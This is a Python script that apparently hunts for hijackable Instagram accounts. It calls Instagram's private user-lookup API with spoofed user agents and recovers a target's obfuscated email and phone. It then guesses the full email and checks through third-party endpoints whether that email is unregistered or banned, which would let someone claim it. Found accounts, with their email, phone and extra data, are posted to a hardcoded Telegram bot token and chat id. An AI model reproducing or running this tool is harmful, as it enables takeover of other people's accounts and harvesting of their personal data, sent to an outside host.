import requests,os,random
from time import sleep
user_agent = [
    "Instagram 99.4.0 S3od_al3nzi (Dmaral3noOoz)",'Instagram 155.0.0.37.107 Android (28/9; 320dpi; 720x1468; samsung; SM-A102U; a10e; exynos7885; en_US; 239490550)',
    'Instagram 64.0.0.12.96 (iPhone8,1; iOS 12_0_1; pt_BR; pt-BR; scale=2.00; gamut=normal; 750x1334; 124976489)',
    'Instagram 8.4.0 (iPhone7,2; iPhone OS 9_3_2; nb_NO; nb-NO; scale=2.00; 750x1334',
    'Instagram 93.1.0.19.102 Android (21/5.0.2; 240dpi; 540x960; samsung; SM-G530H; fortuna3g; qcom; ar_AE; 154400379)'
]
ic="874919066"
X=int(input("[?] With telegram ? \n[!] 0 = NO | 1 = YES\n+> "))
if X == 1 :
	try:
		tel=requests.post(f"https://api.telegram.org/bot2025157803:AAHetK41bvjw0ker2huKvoUeXwyWzYIf_-0/sendMessage?chat_id={ic}&text=HI\nIf you have a problem tell me\nINSTA : @M0B.STORE | TELE : @ZXXXXZV")
	except:
		print("[!] Try with VPN ")
		input("")
		exit()
else:
	pass
os.system('cls' if os.name == 'nt' else 'clear')#DOOM
print("""\033[0;97m𝐈𝐍𝐒𝐓𝐀 : 𝟗𝟔𝟖.𝐎𝐏𝐒\n\033[1;34m𝐈𝐟 𝐲𝐨𝐮 𝐡𝐚𝐯𝐞 𝐚 𝐩𝐫𝐨𝐛𝐥𝐞𝐦, 𝐭𝐞𝐥𝐥 𝐦𝐞 𝐨𝐧 𝐈𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦""")
def ops ():
	print('\n'+'\033[1;30m='*20+'\n')
	user=input("\033[1;30m[\033[0;37m?\033[1;30m] username or url user :\033[0;37m")
	try:
		user=user.split("/")[3]
		user=user.split("?")[0] or user.split("/")[0]
	except:
		pass
	url = "https://i.instagram.com:443/api/v1/users/lookup/"
	cookies = {"mid": "XOSINgABAAG1IDmaral3noOozrK0rrNSbPuSbzHq"}
	x=random.choice(user_agent)
	headers = {"Connection": "close", "X-IG-Connection-Type": "WIFI", "X-IG-Capabilities": "3R4=",
           "Accept-Language": "ar-AE",
           "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
           "User-Agent": x,
           "Accept-Encoding": "gzip, deflate"}
	data = {"signed_body": "35a2d547d3b6ff400f713948cdffe0b789a903f86117eb6e2f3e573079b2f038.{\"q\":\"%s\"}" % user }
	try:
		re = requests.post(url, headers=headers, cookies=cookies, data=data)
		if re.status_code == 200:
			pass
		elif re.status_code == 409 or 404:
			print("\033[1;31m[!] username bad !")
			print('\n'+'\033[1;30m='*20+'\n')
			ops()
		elif re.status_code == 429:
			print("\033[1;31m[!] wait 5m")
			print('\n'+'\033[1;30m='*20+'\n')
			sleep(60*5)
			ops()
		info = re.json()
	except:
		print("\033[1;31m[!] there is no Internet")
		print('\n'+'\033[1;30m='*20+'\n')
		ops()
	try:
		print("\033[1;30m[\033[0;37m$\033[1;30m] Email :\033[1;32m "+info['obfuscated_email'])
		m1=(user[0])
		m2=(user[-1])
		s=info["obfuscated_email"].split("@")[0]
		m3=(s[0])
		m4=(s[-1])
		if m1 == m3 and m2 == m4:
			v=0
			if '@yahoo.com' in info["obfuscated_email"]:
				s1="@yahoo.com"
			elif '@gmail.com' in info["obfuscated_email"]:
				s1="@gmail.com"
			elif "@a**.com" in info["obfuscated_email"]:
				s1="@aol.com"
			elif "@hotmail.com" in info["obfuscated_email"]:
				s1="@hotmail.com"
			elif "@o*****.sa" in info["obfuscated_email"]:
				s1="outlook.sa"
			elif "@g*****.com" in info["obfuscated_email"]:
				s1="@googlemail.com"
			elif '@m***.com' in info["obfuscated_email"]:
				s1="@mail.com"
			elif '@f*****.fm' in info["obfuscated_email"]:
				s1="@fastmail.fm"
			else:
				s1="@"+info["obfuscated_email"].split("@")[1]
			if "*" in s1:
				print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;31mNO")
				ops()
			else:
				eml=user+s1
				p=requests.get("http://tweakpy-filza.ueuo.com/api.php?email="+eml).text
				if "False" in p:
					if v == 1:
							rm=requests.get("https://jftv.pythonanywhere.com/IGMail/"+user+"@googlemail.com").text
					else:
							rm=requests.get("https://jftv.pythonanywhere.com/IGMail/"+eml).text
					if "Linked Or Ban" in rm:
						print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;32mYES")
						print("\033[1;30m[\033[0;37m$\033[1;30m] Email Available :\033[1;32m "+eml)
					else:
						print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;31mNO")
						ops()
				else:
					print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;31mNO")
					ops()
		else:
			print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;31mNO")
			ops()
	except:
		print("\033[1;30m[\033[0;37m$\033[1;30m] Email :\033[1;31m False")
		ops()
	try:
		po=info['obfuscated_phone']
		print("\033[1;30m[\033[0;37m$\033[1;30m] Phone number :\033[1;32m "+ po)
	except:
		print("\033[1;30m[\033[0;37m$\033[1;30m] Phone number : \033[1;31mFalse")
		po="False"
	try:
		iid=info['user_id']
		print(f"\033[1;30m[\033[0;37m$\033[1;30m] user id :\033[1;32m {iid}")
	except:
		print("\033[1;30m[\033[0;37m$\033[1;30m] user id : \033[1;31mFalse")
	try:
		uid=info['user_id']
		x=requests.get(f"https://o7aa.pythonanywhere.com/?id={uid}").text
		x1=str(x).split('"data": ')[1]
		x2=str(x1).split(', "telegram":')[0]
		print("\033[1;30m[\033[0;37m$\033[1;30m] data :\033[1;32m "+x2)
	except:
		print("\033[1;30m[\033[0;37m$\033[1;30m] data : \033[1;31mFalse ")
	if X == 1:
		tel=requests.post(f"https://api.telegram.org/bot2025157803:AAHetK41bvjw0ker2huKvoUeXwyWzYIf_-0/sendMessage?chat_id={ic}&text=NEW OLD ACC\nUser : {user}\nEmail : {eml} Available or ban\nPhone : {po}\nData : {x2}\nINSTA : @M0B.STORE | TELE : @ZXXXXZV")
	else:
		pass
	print('\n'+'\033[1;30m='*20+'\n')
	ops()
ops()
